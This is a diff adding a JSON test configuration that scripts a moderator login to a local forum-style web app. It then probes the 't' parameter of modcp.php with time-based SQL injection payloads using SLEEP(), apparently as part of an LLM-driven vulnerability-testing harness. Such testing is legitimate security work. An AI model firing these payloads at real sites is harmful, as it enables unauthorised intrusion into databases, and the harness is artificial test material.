@@ -1,0 +1,66 @@
+[
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:3200",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "open_login",
+          "method": "GET",
+          "url": "/login.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {},
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "login_moderator",
+          "method": "POST",
+          "url": "/login.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "username": "<moderator_user>",
+            "password": "<moderator_password>",
+            "login": "true"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "sqli_modcp_t",
+          "method": "GET",
+          "url": "/modcp.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {
+            "mode": "lock",
+            "t": "<t>",
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {},
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "t"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "t": [
+        "1",
+        "1 AND (SELECT 9461 FROM (SELECT(SLEEP(5)))KxhM)",
+        "1 OR SLEEP(3)",
+        "1 AND IF(1=1,SLEEP(3),0)"
+      ]
+    }
+  }
+]
